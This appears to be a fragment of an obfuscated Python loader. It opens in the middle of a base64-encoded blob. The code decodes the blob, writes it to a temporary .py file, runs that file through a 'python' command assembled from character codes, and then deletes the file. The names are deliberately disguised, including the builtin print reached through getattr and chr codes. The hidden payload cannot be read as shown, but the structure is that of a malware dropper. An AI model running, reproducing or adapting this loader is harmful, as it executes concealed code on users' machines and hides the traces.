Vx4MDBceDE5XHg5OCpceGQ3XHgxYSxceGQyXHgxYSxceGE4XFxceGQzXHgxYTpceGMwRFx4ZDBceDAwXHgxOVx4ZDFceDAwSVx4ZDlceDAwXHgwNFx4ZDBceDA1XHgxNlx4OThceDA0XHhkMVx4MDVceDFjXHhkMFx4MWU2XHhkMVx4MDU2XHhiOFx4MDRceGQxXHgwNTxceGI4fFx4ZDFceDA1S1x4YzhUXHhkMVx4MDVRXHhkMFNWXHhkMVx4MDVWXHhkNFx4MDBXXHhkOVx4MDBceDA1XHg4MGZceDg1XHJceGY3XHRceDAwXHgwNlx4MTZceGQ1XHgwNVx4MTVceGZhc1x4MGNceDAwXHgwMFx4MDBceGM1Ilx4MTJHXHgwNVx4MDNceGM3XHgwNVxuR1x4MTNceDA3Jykp')
try:
	with t.NamedTemporaryFile(delete=False, suffix='.py') as ghostfile:
		ghostfile.write(lmao(ghostenc))
		ghostpath = ghostfile.name
	stem(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + ghostpath + '"')
except Exception as ghost_err:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(ghost_err)
finally:
	if 'ghostpath' in locals() and ghost_path.exists(ghostpath):
		grdmv(ghostpath)
